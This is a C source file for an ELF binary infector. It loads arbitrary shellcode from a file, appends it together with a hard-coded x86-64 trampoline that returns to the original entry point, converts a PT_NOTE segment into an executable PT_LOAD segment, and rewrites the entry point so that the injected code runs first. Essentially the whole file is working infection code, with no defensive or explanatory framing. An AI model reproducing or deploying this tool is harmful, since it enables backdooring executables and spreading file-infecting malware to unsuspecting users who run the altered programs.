#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <elf.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

Elf64_Ehdr* read_elf64_header(int fd);
Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum);
int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs);
int write_elf64_header(int fd, Elf64_Ehdr *header);
unsigned char* read_file(const char *filename, size_t *length);
void write_u64_le(unsigned char *dest, uint64_t val);
void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset);

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ELF File> <Shellcode File>\n", argv[0]);
        exit(1);
    }

    const char *elf_path = argv[1];
    const char *bin_path = argv[2];

    // Open ELF file with RW permissions
    int elf_fd = open(elf_path, O_RDWR);
    if (elf_fd < 0) {
        fprintf(stderr, "Error opening ELF file '%s': %s\n", elf_path, strerror(errno));
        exit(1);
    }

    // Load shellcode from file
    size_t shellcode_len = 0;
    unsigned char *shellcode = read_file(bin_path, &shellcode_len);
    if (shellcode == NULL) {
        fprintf(stderr, "Error reading shellcode file '%s'\n", bin_path);
        close(elf_fd);
        exit(1);
    }

    // Parse ELF and program headers
    Elf64_Ehdr *elf_header = read_elf64_header(elf_fd);
    if (elf_header == NULL) {
        fprintf(stderr, "Error reading ELF header\n");
        close(elf_fd);
        free(shellcode);
        exit(1);
    }

    Elf64_Phdr *program_headers = read_elf64_program_headers(elf_fd, elf_header->e_phoff, elf_header->e_phnum);
    if (program_headers == NULL) {
        fprintf(stderr, "Error reading program headers\n");
        close(elf_fd);
        free(elf_header);
        free(shellcode);
        exit(1);
    }

    // Save the old entry point so we can jump later
    uint64_t original_entry = elf_header->e_entry;

    // Calculate offsets for patching the ELF and program headers
    struct stat st;
    if (fstat(elf_fd, &st) != 0) {
        fprintf(stderr, "Error getting ELF file metadata: %s\n", strerror(errno));
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    uint64_t file_offset = st.st_size;
    uint64_t memory_offset = 0xc00000000ULL + file_offset;

    // Patch shellcode to jump to the original entry point after finishing
    // 
    // We'll be setting e_entry to memory_offset, so we we'll pass it
    // ahead of time to the patch function 
    patch(&shellcode, &shellcode_len, memory_offset, original_entry);
    

    // After the patch function executes, our shellcode length and buffer 
    // are different. Update sc_len to the patched length to be pedantic
    // 
    uint64_t sc_len = (uint64_t)shellcode_len;

    // Look for PT_NOTE section
    for (int i = 0; i < elf_header->e_phnum; i++) {
        if (program_headers[i].p_type == PT_NOTE) {
            // Convert to a PT_LOAD section with values to load shellcode
            printf("[+] Found PT_NOTE section\n");
            printf("[+] Changing to PT_LOAD\n");
            program_headers[i].p_type = PT_LOAD;
            program_headers[i].p_flags = PF_R | PF_X;
            program_headers[i].p_offset = file_offset;
            program_headers[i].p_vaddr = memory_offset;
            program_headers[i].p_memsz += sc_len;
            program_headers[i].p_filesz += sc_len;
            // Patch the ELF header to start at the shellcode
            elf_header->e_entry = memory_offset;
            printf("[+] Patched e_entry\n");
            break;
        }
    }

   
    // Append shellcode to the very end of the target ELF
    if (lseek(elf_fd, 0, SEEK_END) < 0) {
        fprintf(stderr, "Error seeking to end of ELF file: %s\n", strerror(errno));
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    if (write(elf_fd, shellcode, shellcode_len) != (ssize_t)shellcode_len) {
        fprintf(stderr, "Error writing shellcode to ELF file\n");
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }

    // Write alterations back to program and ELF headers
    if (write_elf64_program_headers(elf_fd, elf_header->e_phoff, elf_header->e_phnum, program_headers) != 0) {
        fprintf(stderr, "Error writing program headers\n");
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    if (write_elf64_header(elf_fd, elf_header) != 0) {
        fprintf(stderr, "Error writing ELF header\n");
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }

    // Free allocated memory and close file descriptor
    free(elf_header);
    free(program_headers);
    free(shellcode);
    close(elf_fd);
    return 0;
}


// Gadget to write a uint64_t value in little-endian to buffer

void write_u64_le(unsigned char *dest, uint64_t val) {
    for (int i = 0; i < 8; i++) {
        dest[i] = (unsigned char)((val >> (8 * i)) & 0xff);
    }
}


// Read entire contents of a file into a dynamically allocated buffer
// File length is stored in *length
// Return pointer to buffer on success, or NULL on failure

unsigned char* read_file(const char *filename, size_t *length) {
    FILE *fp = fopen(filename, "rb");
    if (fp == NULL) {
        fprintf(stderr, "Error opening file '%s': %s\n", filename, strerror(errno));
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "Error seeking in file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error getting file size for '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    rewind(fp);
    unsigned char *buffer = malloc(file_size);
    if (buffer == NULL) {
        fprintf(stderr, "Error allocating memory for file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    size_t read_size = fread(buffer, 1, file_size, fp);
    if (read_size != (size_t)file_size) {
        fprintf(stderr, "Error reading file '%s'\n", filename);
        free(buffer);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *length = read_size;
    return buffer;
}


// Read the ELF64 header from the given file descriptor
// Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure

Elf64_Ehdr* read_elf64_header(int fd) {
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to beginning of ELF file\n");
        return NULL;
    }
    Elf64_Ehdr *header = malloc(sizeof(Elf64_Ehdr));
    if (header == NULL) {
        fprintf(stderr, "Error allocating memory for ELF header\n");
        return NULL;
    }
    if (read(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "Error reading ELF header\n");
        free(header);
        return NULL;
    }
    return header;
}


// Read ELF64 program headers from the given file descriptor at offset phoff
// expecting phnum headers 
// Return a pointer to an allocated array of program headers
// or NULL on failure

Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum) {
    if (lseek(fd, phoff, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to program headers offset\n");
        return NULL;
    }
    Elf64_Phdr *phdrs = malloc(sizeof(Elf64_Phdr) * phnum);
    if (phdrs == NULL) {
        fprintf(stderr, "Error allocating memory for program headers\n");
        return NULL;
    }
    size_t total_size = sizeof(Elf64_Phdr) * phnum;
    if (read(fd, phdrs, total_size) != (ssize_t)total_size) {
        fprintf(stderr, "Error reading program headers from ELF file\n");
        free(phdrs);
        return NULL;
    }
    return phdrs;
}


// Write the ELF64 program headers to the file at offset phoff
// Return 0 on success, or non-zero on failure

int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs) {
    if (lseek(fd, phoff, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to program headers offset for writing\n");
        return 1;
    }
    size_t total_size = sizeof(Elf64_Phdr) * phnum;
    if (write(fd, phdrs, total_size) != (ssize_t)total_size) {
        fprintf(stderr, "Error writing program headers to ELF file\n");
        return 1;
    }
    return 0;
}


// Write the ELF64 header to the beginning of the file
// Return 0 on success, or non-zero on failure

int write_elf64_header(int fd, Elf64_Ehdr *header) {
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to beginning of ELF file for header writing\n");
        return 1;
    }
    if (write(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "Error writing ELF header to file\n");
        return 1;
    }
    return 0;
}

// Patch in shellcode from jumpstart.s to resolve original_entry point

void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t original_entry) {
   
    unsigned char jump_shellcode[] = {
        0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
        0x49, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x49, 0xbb, 0xb5, 0x00, 0x6b,
        0xb1, 0xb5, 0x00, 0x6b, 0xb1, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0,
        0x4c, 0x01, 0xd8, 0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3
    };
    // Write values using little-endian ordering
    write_u64_le(&jump_shellcode[7], (uint64_t)(*shellcode_len));
    write_u64_le(&jump_shellcode[17], entry_point);
    write_u64_le(&jump_shellcode[27], original_entry);

    // Extend shellcode vector by appending the jump_shellcode size;
    // Realloc new size, memcpy jump_shellcode into new_shellcode
    size_t new_len = *shellcode_len + sizeof(jump_shellcode);
    unsigned char *new_shellcode = realloc(*shellcode, new_len);
    if (new_shellcode == NULL) {
        fprintf(stderr, "Error reallocating shellcode buffer\n");
        free(*shellcode);
        exit(1);
    }
    memcpy(new_shellcode + *shellcode_len, jump_shellcode, sizeof(jump_shellcode));
    *shellcode = new_shellcode;
    *shellcode_len = new_len;
}
